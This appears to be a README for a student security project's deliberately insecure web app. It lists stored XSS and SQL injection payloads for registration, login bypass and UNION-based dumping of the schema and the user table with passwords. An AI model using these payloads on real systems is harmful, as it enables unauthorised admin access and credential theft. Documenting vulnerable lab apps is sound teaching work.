# Computer Security Project

## This is the unsecure version

### Commands

#### stored XSS on section 4

Create a new client with the name `<script>alert(1)</script>`

#### sqli on section 1

Regitering a new user with this username `hacker', 'hacker@mail.com', true, true) RETURNING \* --` will give it admin privilages

#### sqli on section 3

Trying to login in with the username `a'or 1=1--` and a random password, will log us in as the first user in the database, which in our case is admin

#### sqli on section 4

All the following queries are on the filter field

To get list of tables and columns in each one:
`fsda' UNION SELECT tbl_name,sql,3,4 FROM sqlite_schema WHERE type='table'--`

To get the users database:
`fsda' UNION SELECT username,password,is_superuser,4 FROM website_user --`
